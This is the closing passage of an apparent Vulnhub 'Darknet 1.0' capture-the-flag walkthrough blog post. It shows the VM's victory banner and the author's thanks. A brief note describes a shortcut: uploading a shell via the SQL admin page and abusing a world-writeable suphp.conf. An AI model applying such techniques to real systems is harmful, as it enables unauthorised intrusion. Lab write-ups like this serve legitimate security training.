<span class="go"> \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/</span>
<span class="go">  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     </span>
<span class="go">   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      </span>
<span class="go">    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  </span>
<span class="go">     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 </span>



<span class="go">     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido</span>
<span class="go">     tratando de llegar hasta aca. Eso es lo que realmente importa!.</span>


<span class="gp">#</span>Blog: www.securitysignal.org

<span class="gp">#</span>Twitter: @SecSignal, @q3rv0
</code></pre></div>
</p>

<p>I learned sooooo much through this VM. Many thanks to qu3rv0 for creating it,
Vulnhub for hosting it, and the people who helped me get through it (esp g0blin).</p>

<p>I look forward to the next one.</p>

<h1 id="note:3817275722f75303351ad52bb23d8c3d">Note</h1>

<p>As it was possible to upload a shell with the SQL Admin page, browsing to <code>/var/www</code> would have
taken us directly to the end stage. All the info was there and <code>suphp.conf</code> is world writeable.
Had I done that though I would have missed out on the XPath challenge, which taught me some new tricks,
as well as all the other fun puzzles.</p>

      </article>

      <p class="post-meta">Tags:&nbsp;
        
            
            <a href="http://unlogic.co.uk//tags/write%20up">write up</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/vulnhub">vulnhub</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/darknet">darknet</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/walkthrough">walkthrough</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/vulnerable">vulnerable</a>
        
      </p>

      
<div id="disqus_thread">
  <script type="text/javascript">
     var disqus_shortname = "unlogic";
     var disqus_identifier = "\/2015\/06\/08\/vulnhub-darknet1-dot-0-write-up\/";

     (function() {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
       dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
  </script>
</div>


    </div>
  </div>
</div>
    <footer class="footer">
      <div class="p2 wrap">
        <div class="measure mt1 center">
      <nav class="social-icons icons">
<a class="fa fa-rss rss" href="http://unlogic.co.uk/index.xml"></a>

<a class="fa fa-twitter twitter" href="https://twitter.com/binaryheadache"></a>

</nav>

          <small>
            Copyright &#169; 2015<br>
            Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/azmelanar/hugo-theme-pixyll" target="_blank">Pixyll</a>
          </small>
        </div>
      </div>
    </footer>

    
    <script src="http://unlogic.co.uk/js/highlight.pack.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>

    
    


</body>
</html>

